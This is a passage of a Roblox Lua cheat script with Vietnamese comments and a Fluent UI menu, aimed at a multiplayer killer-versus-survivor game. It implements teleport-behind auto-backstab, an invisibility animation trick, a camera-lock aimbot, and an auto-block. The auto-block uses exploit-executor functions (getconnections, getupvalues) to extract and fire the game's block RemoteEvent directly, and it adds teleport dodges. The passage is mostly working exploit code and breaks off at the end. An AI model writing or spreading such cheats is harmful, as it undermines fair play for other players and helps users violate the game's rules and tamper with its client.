2442 |     local function getNearbyKillers(position)
2443 |         local killers = {}
2444 |         for _, plr in ipairs(Players:GetPlayers()) do
2445 |             if plr ~= lp and plr.Character then
2446 |                 local char = plr.Character
2447 |                 local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
2448 |                 if hrp then
2449 |                     local dist = (hrp.Position - position).Magnitude
2450 |                     if dist <= checkRadius then
2451 |                         table.insert(killers, {model = char, hrp = hrp, dist = dist})
2452 |                     end
2453 |                 end
2454 |             end
2455 |         end
2456 |         return killers
2457 |     end
2458 | 
2459 |     local function getNearbyAIKillers(hrp)
2460 |         local killers = {}
2461 |         for _, killer in ipairs(killersFolder:GetChildren()) do
2462 |             local kHRP = killer:FindFirstChild("HumanoidRootPart")
2463 |             if kHRP then
2464 |                 local dist = (kHRP.Position - hrp.Position).Magnitude
2465 |                 if dist <= checkRadius then
2466 |                     table.insert(killers, {model = killer, hrp = kHRP, dist = dist})
2467 |                 end
2468 |             end
2469 |         end
2470 |         return killers
2471 |     end
2472 | 
2473 |     -- =====================
2474 |     -- üîÑ Main Loop
2475 |     -- =====================
2476 |     local cooldown = false
2477 |     local lastTarget = nil
2478 | 
2479 |     RunService.Heartbeat:Connect(function()
2480 |         if not enabled or cooldown then return end
2481 |         local char, humanoid, myHRP = getCharacter()
2482 |         if not (char and humanoid and myHRP) then return end
2483 | 
2484 |         -- üö® Ch·ªâ ho·∫°t ƒë·ªông n·∫øu model l√† "TwoTime"
2485 |         if char.Name ~= "TwoTime" then return end
2486 | 
2487 |         if Mode == "Player Aimbot" then
2488 |             if isPlayingTargetAnimation(humanoid) then
2489 |                 local killers = getNearbyKillers(myHRP.Position)
2490 |                 if #killers > 0 then
2491 |                     table.sort(killers, function(a,b) return a.dist < b.dist end)
2492 |                     local target = killers[1]
2493 |                     cooldown = true
2494 | 
2495 |                     local start = tick()
2496 |                     local conn
2497 |                     conn = RunService.Heartbeat:Connect(function()
2498 |                         if not (char and target.hrp and char.Parent and target.hrp.Parent) then
2499 |                             if conn then conn:Disconnect() end
2500 |                             cooldown = false
2501 |                             return
2502 |                         end
2503 |                         if tick() - start >= 0.7 then
2504 |                             if conn then conn:Disconnect() end
2505 |                             task.delay(1, function() cooldown = false end)
2506 |                             return
2507 |                         end
2508 |                         teleportBehind(target.hrp, myHRP)
2509 |                         useDagger()
2510 |                     end)
2511 |                 end
2512 |             end
2513 | 
2514 |         elseif Mode == "AI Aimbot" then
2515 |             local killers = getNearbyAIKillers(myHRP)
2516 |             if #killers > 0 then
2517 |                 table.sort(killers, function(a,b) return a.dist < b.dist end)
2518 |                 local target = killers[1]
2519 |                 if target.model ~= lastTarget and isBehindTarget(target.hrp, myHRP) then
2520 |                     cooldown = true
2521 |                     lastTarget = target.model
2522 | 
2523 |                     local start = tick()
2524 |                     local conn
2525 |                     conn = RunService.Heartbeat:Connect(function()
2526 |                         if not (char and char.Parent and target.hrp and target.hrp.Parent) then
2527 |                             if conn then conn:Disconnect() end
2528 |                             return
2529 |                         end
2530 |                         if tick() - start >= 0.7 then
2531 |                             if conn then conn:Disconnect() end
2532 |                             task.delay(10, function()
2533 |                                 cooldown = false
2534 |                                 lastTarget = nil
2535 |                             end)
2536 |                             return
2537 |                         end
2538 |                         teleportBehind(target.hrp, myHRP)
2539 |                         useDagger()
2540 |                     end)
2541 |                 end
2542 |             end
2543 |         end
2544 |     end)
2545 | 
2546 |     lp.CharacterAdded:Connect(function()
2547 |         task.wait(1)
2548 |         print("üîÑ Character respawned/changed, Auto Backstab v·∫´n ho·∫°t ƒë·ªông (n·∫øu model = 'TwoTime').")
2549 |     end)
2550 | end
2551 | 
2552 | 
2553 | 
2554 |     Tabs.Main:AddSection("007n7")
2555 | 
2556 | 
2557 | do
2558 |     local Players = game:GetService("Players")
2559 |     local LocalPlayer = Players.LocalPlayer
2560 | 
2561 |     local running = false
2562 |     local animTrack
2563 |     local InvisibleEnabled = false
2564 | 
2565 |     -- üîç T·ª± ƒë·ªông l·∫•y Survivors trong workspace
2566 |     local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
2567 | 
2568 |     local function getHumanoid()
2569 |         local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
2570 |         return char:FindFirstChildOfClass("Humanoid"), char
2571 |     end
2572 | 
2573 |     local function getAnimator(humanoid)
2574 |         local animator = humanoid:FindFirstChildOfClass("Animator")
2575 |         if not animator then
2576 |             animator = Instance.new("Animator")
2577 |             animator.Parent = humanoid
2578 |         end
2579 |         return animator
2580 |     end
2581 | 
2582 |     local function playInvisibleAnim(humanoid)
2583 |         local animator = getAnimator(humanoid)
2584 |         if not animTrack or not animTrack.IsPlaying then
2585 |             local animation = Instance.new("Animation")
2586 |             animation.AnimationId = "rbxassetid://75804462760596"
2587 |             animTrack = animator:LoadAnimation(animation)
2588 |             animTrack.Looped = true
2589 |             animTrack:Play()
2590 |             animTrack:AdjustSpeed(0)
2591 |         end
2592 |     end
2593 | 
2594 |     local function stopInvisibleAnim()
2595 |         if animTrack and animTrack.IsPlaying then
2596 |             animTrack:Stop()
2597 |             animTrack = nil
2598 |         end
2599 |     end
2600 | 
2601 |     -- ‚úÖ Ki·ªÉm tra n·∫øu character l√† survivor (trong folder Survivors)
2602 |     local function isSurvivorModel(char)
2603 |         if not char then return false end
2604 |         if survivorsFolder:FindFirstChild(char.Name) then
2605 |             return true
2606 |         end
2607 |         return false
2608 |     end
2609 | 
2610 |     local function handleToggle(enabled)
2611 |         InvisibleEnabled = enabled
2612 |         local humanoid, char = getHumanoid()
2613 |         if not humanoid or not char then return end
2614 | 
2615 |         if enabled then
2616 |             running = true
2617 |             task.spawn(function()
2618 |                 while running and InvisibleEnabled do
2619 |                     humanoid, char = getHumanoid()
2620 |                     if not humanoid or not char then
2621 |                         task.wait(0.5)
2622 |                         continue
2623 |                     end
2624 | 
2625 |                     if isSurvivorModel(char) then
2626 |                         playInvisibleAnim(humanoid)
2627 |                     else
2628 |                         stopInvisibleAnim()
2629 |                     end
2630 |                     task.wait(0.5)
2631 |                 end
2632 |             end)
2633 |         else
2634 |             running = false
2635 |             stopInvisibleAnim()
2636 |         end
2637 |     end
2638 | 
2639 |     LocalPlayer.CharacterAdded:Connect(function(char)
2640 |         task.wait(1)
2641 |         if InvisibleEnabled and isSurvivorModel(char) then
2642 |             handleToggle(true)
2643 |         end
2644 |     end)
2645 | 
2646 |     -- üü¢ Fluent UI Toggle
2647 |     Tabs.Main:AddToggle("InstantInvisibleV2", {
2648 |         Title = "Instant Invisible",
2649 |         Default = false
2650 |     }):OnChanged(function(Value)
2651 |         handleToggle(Value)
2652 |     end)
2653 | end
2654 | 
2655 | 
2656 | 
2657 | do
2658 |     -- Invisible upon Cloning (sandboxed)
2659 |     local Players = game:GetService("Players")
2660 |     local LocalPlayer = Players.LocalPlayer
2661 | 
2662 |     local running = false
2663 |     local animTrack
2664 | 
2665 |     local function getHumanoid()
2666 |         local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
2667 |         return char:FindFirstChildOfClass("Humanoid"), char
2668 |     end
2669 | 
2670 |     local function getAnimator(humanoid)
2671 |         local animator = humanoid:FindFirstChildOfClass("Animator")
2672 |         if not animator then
2673 |             animator = Instance.new("Animator")
2674 |             animator.Parent = humanoid
2675 |         end
2676 |         return animator
2677 |     end
2678 | 
2679 |     local function playInvisibleAnim(humanoid)
2680 |         local animator = getAnimator(humanoid)
2681 |         if not animTrack or not animTrack.IsPlaying then
2682 |             local animation = Instance.new("Animation")
2683 |             animation.AnimationId = "rbxassetid://75804462760596"
2684 |             animTrack = animator:LoadAnimation(animation)
2685 |             animTrack.Looped = true
2686 |             animTrack:Play()
2687 |             animTrack:AdjustSpeed(0)
2688 |         end
2689 |     end
2690 | 
2691 |     local function stopInvisibleAnim()
2692 |         if animTrack and animTrack.IsPlaying then
2693 |             animTrack:Stop()
2694 |             animTrack = nil
2695 |         end
2696 |     end
2697 | 
2698 |     local function handleToggle(enabled)
2699 |         local humanoid, char = getHumanoid()
2700 |         if not humanoid or not char then return end
2701 | 
2702 |         if enabled then
2703 |             running = true
2704 |             task.spawn(function()
2705 |                 while running do
2706 |                     humanoid, char = getHumanoid()
2707 |                     if not humanoid or not char then break end
2708 | 
2709 |                     local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
2710 |                     local root = char:FindFirstChild("HumanoidRootPart")
2711 | 
2712 |                     if torso and torso.Transparency ~= 0 then
2713 |                         playInvisibleAnim(humanoid)
2714 |                         if root then root.Transparency = 0.4 end
2715 |                     else
2716 |                         stopInvisibleAnim()
2717 |                         if root then root.Transparency = 1 end
2718 |                     end
2719 | 
2720 |                     task.wait(0.5)
2721 |                 end
2722 |             end)
2723 |         else
2724 |             running = false
2725 |             stopInvisibleAnim()
2726 |             if char and char:FindFirstChild("HumanoidRootPart") then
2727 |                 char.HumanoidRootPart.Transparency = 1
2728 |             end
2729 |         end
2730 |     end
2731 | 
2732 |     -- ‚úÖ Toggle d·∫°ng m·ªõi Fluent UI
2733 |     Tabs.Main:AddToggle("InvisibleCloneV2", {
2734 |         Title = "Invisible if cloned",
2735 |         Default = _G.InvisibleClone or false
2736 |     }):OnChanged(function(Value)
2737 |         _G.InvisibleClone = Value
2738 |         handleToggle(Value)
2739 |     end)
2740 | end
2741 | 
2742 | 
2743 | 
2744 | 
2745 |     Tabs.Main:AddSection("Dusekkar")
2746 | 
2747 | 
2748 | --// Dusk Aim Assist (Fluent Dropdown tr√™n Toggle) - Locked Target Version
2749 | do
2750 | -- üß† Services
2751 | local Players = game:GetService("Players")
2752 | local RunService = game:GetService("RunService")
2753 | local Workspace = game:GetService("Workspace")
2754 | 
2755 | -- üìç References
2756 | local LocalPlayer = Players.LocalPlayer
2757 | local Camera = Workspace.CurrentCamera
2758 | 
2759 | -- ‚öôÔ∏è Config
2760 | local TargetAnimationID = "rbxassetid://77894750279891"
2761 | local Enabled = false
2762 | local Smoothness = 0.2
2763 | 
2764 | -- Th·ªùi gian t·ªëi ƒëa kh√≥a target (gi√¢y) sau khi ch·ªçn target
2765 | local LOCK_DURATION = 0.7
2766 | 
2767 | -- üéõÔ∏è Fluent UI Controls
2768 | local toggleFlag = Instance.new("BoolValue")
2769 | toggleFlag.Name = "DuskAim_ToggleFlag"
2770 | toggleFlag.Value = false
2771 | 
2772 | -- Dropdown ·ªü TR√äN
2773 | Tabs.Main:AddDropdown("DuskSmooth", {
2774 |     Title = "Smoothness",
2775 |     Values = {"Low", "Medium", "High"},
2776 |     Default = "Medium",
2777 | }):OnChanged(function(value)
2778 |     if value == "Low" then
2779 |         Smoothness = 0.1
2780 |     elseif value == "Medium" then
2781 |         Smoothness = 0.2
2782 |     elseif value == "High" then
2783 |         Smoothness = 0.4
2784 |     end
2785 | end)
2786 | 
2787 | -- Toggle ·ªü D∆Ø·ªöI
2788 | Tabs.Main:AddToggle("DuskAim", {
2789 |     Title = "Dusk Aim Assist",
2790 |     Default = false,
2791 | }):OnChanged(function(state)
2792 |     Enabled = state
2793 |     toggleFlag.Value = state
2794 |     -- reset any locked target when toggling off
2795 |     if not state then
2796 |         currentTarget = nil
2797 |         lockExpires = nil
2798 |     end
2799 | end)
2800 | 
2801 | -- üéØ Find nearest player (returns HumanoidRootPart or nil)
2802 | local function getNearestPlayerRoot()
2803 |     if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
2804 |         return nil
2805 |     end
2806 | 
2807 |     local nearest, distance = nil, math.huge
2808 |     local myPos = LocalPlayer.Character.HumanoidRootPart.Position
2809 |     for _, player in pairs(Players:GetPlayers()) do
2810 |         if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
2811 |             local root = player.Character.HumanoidRootPart
2812 |             local dist = (root.Position - myPos).Magnitude
2813 |             if dist < distance then
2814 |                 distance = dist
2815 |                 nearest = root
2816 |             end
2817 |         end
2818 |     end
2819 |     return nearest
2820 | end
2821 | 
2822 | -- Helper: check if a humanoid is currently playing the target animation
2823 | local function humanoidIsPlayingTargetAnimation(humanoid)
2824 |     if not humanoid then return false end
2825 |     for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
2826 |         if track.Animation and track.Animation.AnimationId == TargetAnimationID then
2827 |             return true
2828 |         end
2829 |     end
2830 |     return false
2831 | end
2832 | 
2833 | -- State for locked target
2834 | local currentTarget = nil          -- HumanoidRootPart (locked)
2835 | local currentTargetHumanoid = nil  -- Humanoid of the locked target's character
2836 | local lockExpires = nil            -- timestamp when lock can be released at earliest
2837 | 
2838 | -- üî• Aimbot logic (RenderStepped)
2839 | RunService.RenderStepped:Connect(function()
2840 |     if not Enabled then
2841 |         return
2842 |     end
2843 | 
2844 |     -- safety: require local character and camera
2845 |     if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Camera then
2846 |         currentTarget = nil
2847 |         currentTargetHumanoid = nil
2848 |         lockExpires = nil
2849 |         return
2850 |     end
2851 | 
2852 |     -- First: detect if ANY player is playing the target animation
2853 |     local anyAnimPlaying = false
2854 |     for _, player in pairs(Players:GetPlayers()) do
2855 |         if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
2856 |             local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
2857 |             if humanoidIsPlayingTargetAnimation(humanoid) then
2858 |                 anyAnimPlaying = true
2859 |                 -- If we don't have a locked target yet, lock to the nearest player NOW
2860 |                 if not currentTarget then
2861 |                     local chosen = getNearestPlayerRoot()
2862 |                     if chosen then
2863 |                         currentTarget = chosen
2864 |                         currentTargetHumanoid = chosen.Parent and chosen.Parent:FindFirstChildOfClass("Humanoid") or nil
2865 |                         lockExpires = tick() + LOCK_DURATION
2866 |                     end
2867 |                 end
2868 |                 -- We break here optionally (we only need to know that an animation is playing).
2869 |                 -- But do not break if we want to check other players' animations as well; either is fine.
2870 |                 -- We'll not break so we keep checking; but one detection is enough to keep anyAnimPlaying = true.
2871 |             end
2872 |         end
2873 |     end
2874 | 
2875 |     -- If there is a locked target, aim at it while animation(s) are playing OR until lockExpires
2876 |     if currentTarget and currentTarget.Parent and currentTargetHumanoid then
2877 |         -- validate target: still has HumanoidRootPart and is alive
2878 |         if not currentTarget or not currentTarget.Parent or not currentTarget.Parent:FindFirstChild("HumanoidRootPart") then
2879 |             -- invalid target, release
2880 |             currentTarget = nil
2881 |             currentTargetHumanoid = nil
2882 |             lockExpires = nil
2883 |             return
2884 |         end
2885 | 
2886 |         -- Determine whether we should continue aiming:
2887 |         -- continue if either (a) any player is currently playing the target animation OR
2888 |         -- (b) we haven't reached lockExpires yet (ensures a short guaranteed aiming window)
2889 |         local continueAiming = anyAnimPlaying or (lockExpires and tick() < lockExpires)
2890 | 
2891 |         if continueAiming then
2892 |             local aimPos = currentTarget.Position
2893 |             local camCFrame = Camera.CFrame
2894 |             -- avoid zero-length direction
2895 |             local dirVec = aimPos - camCFrame.Position
2896 |             if dirVec.Magnitude > 0 then
2897 |                 local direction = dirVec.Unit
2898 |                 Camera.CFrame = Camera.CFrame:Lerp(
2899 |                     CFrame.new(camCFrame.Position, camCFrame.Position + direction),
2900 |                     Smoothness
2901 |                 )
2902 |             end
2903 |             return
2904 |         else
2905 |             -- no animation playing and lock expired -> release target, allow new selection next detection
2906 |             currentTarget = nil
2907 |             currentTargetHumanoid = nil
2908 |             lockExpires = nil
2909 |             return
2910 |         end
2911 |     end
2912 | 
2913 |     -- If we get here: no locked target, but if an animation is playing we already set one above.
2914 |     -- Nothing to do otherwise.
2915 | end)
2916 | end
2917 | 
2918 | 
2919 | 
2920 |     Tabs.Main:AddSection("Guest1337")
2921 | 
2922 | 
2923 | 
2924 | 
2925 | do
2926 |     local Players = game:GetService("Players")
2927 |     local RunService = game:GetService("RunService")
2928 |     local localPlayer = Players.LocalPlayer
2929 | 
2930 |     local Killers = {
2931 |         ["Slasher"] = true,
2932 |         ["1x1x1x1"] = true,
2933 |         ["c00lkidd"] = true,
2934 |         ["Noli"] = true,
2935 |         ["JohnDoe"] = true,
2936 |         ["Guest 666"] = true,
2937 |         ["Sixer"] = true
2938 |     }
2939 | 
2940 |     local function isKiller(player)
2941 |         local char = player.Character
2942 |         if not char then return false end
2943 |         return Killers[char.Name] == true
2944 |     end
2945 | 
2946 |     local animationIds = {
2947 |         ["83829782357897"]  = true, -- Slash, 1x1x1x1
2948 |         ["126830014841198"] = true, -- Slash, Jason
2949 |         ["126355327951215"] = true, -- Behead, Jason
2950 |         ["121086746534252"] = true, -- GashingWoundStart, Jason
2951 |         ["105458270463374"] = true, -- Slash, JohnDoe
2952 |         ["18885909645"]     = true, -- Attack, c00lkid
2953 |         ["94162446513587"]  = true, -- Slash, JohnDoe, Skin: !Joner
2954 |         ["93069721274110"]  = true, -- Slash, JohnDoe, Skin: AnnihilationJohnDoe
2955 |         ["97433060861952"]  = true, -- Slash, JohnDoe, Skin: #SK
2956 |         ["121293883585738"] = true, -- Slash, 1x1x1x1
2957 |         ["92173139187970"]  = true, -- Slash, Skin: Hacklord1x1x1x1
2958 |         ["106847695270773"] = true, -- GashingWoundStart, Jason, Skin: Subject0Jason
2959 |         ["125403313786645"] = true, -- Slash, Jason, Skin: Subject0Jason
2960 |         ["81639435858902"]  = true, -- Behead, Jason, Skin: WhitePumpkinJason
2961 |         ["137314737492715"] = true, -- GashingWoundStart, Jason, Skin: WhitePumpkinJason
2962 |         ["120112897026015"] = true, -- Slash, Jason, Skin: WhitePumpkinJason
2963 |         ["82113744478546"]  = true, -- Behead, Jason (nhi·ªÅu skin)
2964 |         ["118298475669935"] = true, -- Slash, Jason (nhi·ªÅu skin)
2965 |         ["126681776859538"] = true, -- Behead, Jason, Skin: PursuerJason
2966 |         ["129976080405072"] = true, -- GashingWoundStart, Jason, Skin: PursuerJason
2967 |         ["109667959938617"] = true, -- Slash, Jason, Skin: PursuerJason
2968 |         ["74707328554358"]  = true, -- Slash, Jason, Skin: #DeadRabbitsJason
2969 |         ["133336594357903"] = true, -- Behead, Jason, Skin: #DeadRabbitsJason
2970 |         ["86204001129974"]  = true, -- GashingWoundStart, Jason, Skin: #DeadRabbitsJason
2971 |         ["70371667919898"]  = true, -- Attack, c00lkidd, Skin: MafiosoC00l
2972 |         ["131543461321709"] = true, -- Attack, c00lkidd, Skin: SaviorC00l
2973 |         ["106776364623742"] = true, -- Walkspeed Overing, c00lkidd (all skins)
2974 |         ["136323728355613"] = true, -- Swing, Noli
2975 |         ["109230267448394"] = true, -- Swing, Noli (all skins)
2976 |         ["139835501033932"] = true, -- VoidRush, Noli (all skins)
2977 |         ["114356208094580"] = true, -- VoidRush2, Noli
2978 |         ["106538427162796"] = true, -- Stab, All Noli
2979 |         ["126896426760253"] = true, -- VoidRush, Noli
2980 |         ["131430497821198"] = true, -- MassInfection, 1x1x1x1
2981 |         ["100592913030351"] = true, -- MassInfection, 1x1x1x1 (Fleskhjerta/AceOfSpades/Lancer)
2982 |         ["70447634862911"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 Old
2983 |         ["83685305553364"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 New
2984 |         ["126171487400618"]  = true, -- Slash, Skin: Hacklord1x1x1x1
2985 |         ["97167027849946"]  = true,
2986 |         ["99135633258223"]  = true,
2987 |         ["98456918873918"]  = true,
2988 |         ["83251433279852"]  = true,
2989 |         ["126681776859538"] = true,
2990 |         ["129976080405072"] = true,
2991 |         ["122709416391891"] = true, -- ƒê√°nh Th∆∞·ªùng Guest 666
2992 |         ["87989533095285"] = true, -- V·ªì T·ªõi Guest 666
2993 |     }
2994 | 
2995 |     local delayedAnimations = {}
2996 | 
2997 |     local toggleOn = false
2998 |     local strictRangeOn = false
2999 |     local detectionRange = 18
3000 | 
3001 |     local blockRemote
3002 |     local blockButton, connections = nil, {}
3003 | 
3004 |     local function findBlockRemote()
3005 |         if blockRemote then return blockRemote end
3006 |         if not blockButton then return nil end
3007 |         for _, conn in ipairs(getconnections(blockButton.MouseButton1Click)) do
3008 |             local f = conn.Function
3009 |             if f and islclosure(f) then
3010 |                 local upvals = getupvalues(f)
3011 |                 for _, v in pairs(upvals) do
3012 |                     if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
3013 |                         blockRemote = v
3014 |                         warn("[AutoBlock] Found Block Remote:", v:GetFullName())
3015 |                         return blockRemote
3016 |                     end
3017 |                 end
3018 |             end
3019 |         end
3020 |         return nil
3021 |     end
3022 | 
3023 |     local function initBlockButton()
3024 |         local gui = localPlayer:FindFirstChild("PlayerGui")
3025 |         if not gui then return end
3026 |         local mainUI = gui:FindFirstChild("MainUI")
3027 |         local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
3028 |         blockButton = container and container:FindFirstChild("Block")
3029 |         if blockButton and blockButton:IsA("ImageButton") then
3030 |             connections = getconnections(blockButton.MouseButton1Click)
3031 |             findBlockRemote()
3032 |         end
3033 |     end
3034 | 
3035 |     initBlockButton()
3036 |     localPlayer.CharacterAdded:Connect(function()
3037 |         task.wait(0)
3038 |         initBlockButton()
3039 |     end)
3040 | 
3041 |     local function fastBlock()
3042 |         if blockRemote then
3043 |             pcall(function()
3044 |                 blockRemote:FireServer(true)
3045 |                 task.delay(1e-10, function()
3046 |                     blockRemote:FireServer(false)
3047 |                 end)
3048 |             end)
3049 |         else
3050 |             if not blockButton or not blockButton.Visible then return end
3051 |             for _, conn in ipairs(connections) do
3052 |                 pcall(function() conn:Fire() end)
3053 |             end
3054 |             pcall(function() blockButton:Activate() end)
3055 |         end
3056 |     end
3057 | 
3058 |     local lastTeleport = 0
3059 |     local function teleportDodge(killerChar)
3060 |         local now = tick()
3061 |         if now - lastTeleport < 5 then return end
3062 |         lastTeleport = now
3063 | 
3064 |         local myChar = localPlayer.Character
3065 |         local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
3066 |         local killerRoot = killerChar and killerChar:FindFirstChild("HumanoidRootPart")
3067 |         if not (myRoot and killerRoot) then return end
3068 | 
3069 |         local oldCFrame = myRoot.CFrame
3070 |         local forward = killerRoot.CFrame.LookVector
3071 | 
3072 |         myRoot.CFrame = killerRoot.CFrame + forward * 7.5
3073 | 
3074 |         task.delay(0.1, function()
3075 |             if myRoot then
3076 |                 myRoot.CFrame = oldCFrame
3077 |             end
3078 |         end)
3079 |     end
3080 | 
3081 |     local function getBoolFlag(name, default)
3082 |         local flag = localPlayer:FindFirstChild(name)
3083 |         if not flag then
3084 |             flag = Instance.new("BoolValue")
3085 |             flag.Name = name
3086 |             flag.Value = default
3087 |             flag.Parent = localPlayer
3088 |         end
3089 |         return flag
3090 |     end
3091 | 
3092 |     local function getNumberFlag(name, default)
3093 |         local flag = localPlayer:FindFirstChild(name)
3094 |         if not flag then
3095 |             flag = Instance.new("NumberValue")
3096 |             flag.Name = name
3097 |             flag.Value = default
3098 |             flag.Parent = localPlayer
3099 |         end
3100 |         return flag
3101 |     end
3102 | 
3103 |     local toggleFlag = getBoolFlag("AutoBlockToggle", false)
3104 |     local strictFlag = getBoolFlag("AutoBlockStrictRange", false)
3105 |     local rangeFlag = getNumberFlag("AutoBlockRange", 18)
3106 | 
3107 |     toggleOn = toggleFlag.Value
3108 |     strictRangeOn = strictFlag.Value
3109 |     detectionRange = rangeFlag.Value
3110 | 
3111 |     Tabs.Main:AddToggle("AutoBlockV2", {Title = "Auto Block V3", Default = toggleOn})
3112 |         :OnChanged(function(state)
3113 |             toggleOn = state
3114 |             toggleFlag.Value = state
3115 |         end)
3116 | 
3117 |     Tabs.Main:AddToggle("StrictRangeCheck", {Title = "Auto Check V3", Default = strictRangeOn})
3118 |         :OnChanged(function(state)
3119 |             strictRangeOn = state
3120 |             strictFlag.Value = state
3121 |         end)
3122 | 
3123 |     Tabs.Main:AddInput("RangeCheckInput", {
3124 |         Title = "Range Check",
3125 |         Default = tostring(detectionRange),
3126 |         Placeholder = "Enter detection range"
3127 |     }):OnChanged(function(txt)
3128 |         local val = tonumber(txt)
3129 |         if val then
3130 |             detectionRange = val
3131 |             rangeFlag.Value = val
3132 |         end
3133 |     end)
3134 | 
3135 |     local playerConns = {}
3136 |     local recentBlocks = {}
3137 |     local COOLDOWN_ZERO, COOLDOWN_MISS = 0, 0
3138 | 
3139 |     local function cleanupPlayerConns(p)
3140 |         local tbl = playerConns[p]
3141 |         if tbl then
3142 |             for _, c in ipairs(tbl) do
3143 |                 if c and c.Disconnect then c:Disconnect() end
3144 |             end
3145 |             playerConns[p] = nil
3146 |         end
3147 |         recentBlocks[p.UserId] = nil
3148 |     end
3149 | 
3150 |     local function shouldBlockNow(p, animId, track)
3151 |         recentBlocks[p.UserId] = recentBlocks[p.UserId] or {}
3152 |         local last = recentBlocks[p.UserId][animId] or 0
3153 |         local now = tick()
3154 |         if track.TimePosition <= 0 then
3155 |             if now - last >= COOLDOWN_ZERO then
3156 |                 recentBlocks[p.UserId][animId] = now
3157 |                 return true
3158 |             end
3159 |             return false
3160 |         else
3161 |             if now - last >= COOLDOWN_MISS then
3162 |                 recentBlocks[p.UserId][animId] = now
3163 |                 return true
3164 |             end
3165 |             return false
3166 |         end
3167 |     end
3168 | 
3169 |     local massInfectionIds = {
3170 |         ["131430497821198"] = true,
3171 |         ["100592913030351"] = true,
3172 |         ["70447634862911"]  = true,
3173 |         ["83685305553364"]  = true,
3174 |     }
3175 | 
3176 |     local function onAnimationPlayed(player, char, track)
3177 |         if not toggleOn then return end
3178 |         if not (track and track.Animation) then return end
3179 |         local animIdStr = track.Animation.AnimationId
3180 |         local id = animIdStr and string.match(animIdStr, "%d+")
3181 |         if not id or not animationIds[id] then return end
3182 | 
3183 |         if strictRangeOn then
3184 |             local myChar = localPlayer.Character
3185 |             local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
3186 |             local root = char and char:FindFirstChild("HumanoidRootPart")
3187 |             if not myRoot or not root then return end
3188 |             local dist = (root.Position - myRoot.Position).Magnitude
3189 |             if dist > detectionRange then return end
3190 |         end
3191 | 
3192 |         if shouldBlockNow(player, id, track) then
3193 |             if massInfectionIds[id] then
3194 |                 task.delay(0.5, fastBlock) -- delay 0.5s cho MassInfection
3195 |             else
3196 |                 fastBlock()
3197 |             end
3198 | 
3199 |             if isKiller(player) and delayedAnimations[id] then
3200 |                 teleportDodge(char)
3201 |             end
3202 |         end
3203 |     end
3204 | 
3205 |     local function monitorCharacter(player, char)
3206 |         if not player or not char then return end
3207 |         local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
3208 |         if not hum then return end
3209 |         local con = hum.AnimationPlayed:Connect(function(track)
3210 |             task.spawn(onAnimationPlayed, player, char, track)
3211 |         end)
3212 |         playerConns[player] = playerConns[player] or {}
3213 |         table.insert(playerConns[player], con)
3214 |     end
3215 | 
3216 |     local function onPlayerAdded(player)
3217 |         if player == localPlayer then return end
3218 |         if player.Character then monitorCharacter(player, player.Character) end
3219 |         local conCharAdded = player.CharacterAdded:Connect(function(char)
3220 |             task.wait(0)
3221 |             monitorCharacter(player, char)
3222 |         end)
3223 |         playerConns[player] = playerConns[player] or {}
3224 |         table.insert(playerConns[player], conCharAdded)
3225 |     end
3226 | 
3227 |     for _, p in ipairs(Players:GetPlayers()) do onPlayerAdded(p) end
3228 |     Players.PlayerAdded:Connect(onPlayerAdded)
3229 |     Players.PlayerRemoving:Connect(cleanupPlayerConns)
3230 | 
3231 |     local circles = {}
3232 | 
3233 |     local function createCircleFor(player, hrp)
3234 |         if circles[player] then circles[player]:Destroy() end
3235 |         local circle = Instance.new("Part")
3236 |         circle.Anchored, circle.CanCollide = true, false
3237 |         circle.Shape = Enum.PartType.Cylinder
3238 |         circle.Size = Vector3.new(0.2, detectionRange * 2, detectionRange * 2)
3239 |         circle.CFrame = hrp.CFrame * CFrame.Angles(0, 0, math.rad(90))
3240 |         circle.Material, circle.Transparency = Enum.Material.Neon, 0.5
3241 |         circle.Color = Color3.fromRGB(255, 0, 0)
3242 |         circle.Parent = workspace
3243 |         circles[player] = circle
3244 |     end
3245 | 
3246 |     local function removeCircle(player)
3247 |         if circles[player] then circles[player]:Destroy() circles[player] = nil end
3248 |     end
3249 | 
3250 |     RunService.Heartbeat:Connect(function()
3251 |         if not strictRangeOn then
3252 |             for _, circle in pairs(circles) do
3253 |                 if circle then circle.Transparency = 1 end
3254 |             end
3255 |             return
3256 |         end
3257 |         local myChar = localPlayer.Character
3258 |         local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
3259 |         if not myRoot then return end
3260 |         for _, player in ipairs(Players:GetPlayers()) do
3261 |             if player ~= localPlayer then
3262 |                 local char = player.Character
3263 |                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
3264 |                 local hum = char and char:FindFirstChildOfClass("Humanoid")
3265 |                 if hrp and hum and hum.Health > 0 and isKiller(player) then
3266 |                     if not circles[player] then createCircleFor(player, hrp) end
3267 |                     local circle = circles[player]
3268 |                     circle.Size = Vector3.new(0.2, detectionRange * 2, detectionRange * 2)
3269 |                     circle.CFrame = hrp.CFrame * CFrame.Angles(0, 0, math.rad(90))
3270 |                     local dist = (myRoot.Position - hrp.Position).Magnitude
3271 |                     circle.Color = (dist <= detectionRange) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
3272 |                     circle.Transparency = 0.5
3273 |                 else
3274 |                     removeCircle(player)
3275 |                 end
3276 |             end
3277 |         end
3278 |     end)
3279 | 
3280 |     Players.PlayerRemoving:Connect(removeCircle)
3281 | end
3282 | 
3283 | 
3284 | 
3285 | 
3286 | 
3287 | 
3288 | do
3289 | local Players = game:GetService("Players")
3290 | local RunService = game:GetService("RunService")
3291 | local lp = Players.LocalPlayer
3292 | 
